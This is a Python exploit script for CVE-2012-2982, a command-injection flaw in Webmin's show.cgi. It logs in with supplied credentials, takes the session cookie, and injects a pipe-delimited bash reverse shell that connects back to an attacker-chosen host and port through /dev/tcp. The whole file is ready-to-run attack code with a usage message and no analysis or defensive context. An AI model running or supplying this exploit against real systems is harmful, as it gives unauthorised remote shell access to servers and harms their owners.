import requests
import sys
import string
import secrets

targetIP = sys.argv[1]
lhost = sys.argv[4]
lport = sys.argv[5]

data = {'page' : "%2F", 'user' : sys.argv[2], 'pass' : sys.argv[3]}
url = "http://" + targetIP + "/session_login.cgi"

def payload():
	payload = "bash -c 'exec bash -i &>/dev/tcp/" + lhost + "/" + lport + " <&1'"
	return payload

def rand():
	alphaNum = string.ascii_letters + string.digits
	randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
	return randChar

def check():
	print("[+] Checking login")

	r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

	if r.status_code == 302 and r.cookies["sid"] != None:
		print("[+] Login successful, executing payload")
		return True
	else:
		print("[-] Failed to login")
		return False

def exploit():
	r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

	sid = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
	exp = "http://" + targetIP + "/file/show.cgi/bin/" + "%s|%s|" % (rand(), payload())
	req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

	if req.status_code == 200 and req.reason == "Document follows":
		print("[+] Payload successful, sending shell")
	else:
		print("[-] Failed to execute payload")

if len(sys.argv) < 6:
	print("[-] Usage: " + sys.argv[0] + " <IP> <Username> <Password> <LHOST> <LPORT>")
	print("[-] This exploit is written for CVE-2012-2982.")
else:
	if check() == True:
		exploit()
	else:
		print("[-] Exploit failed")
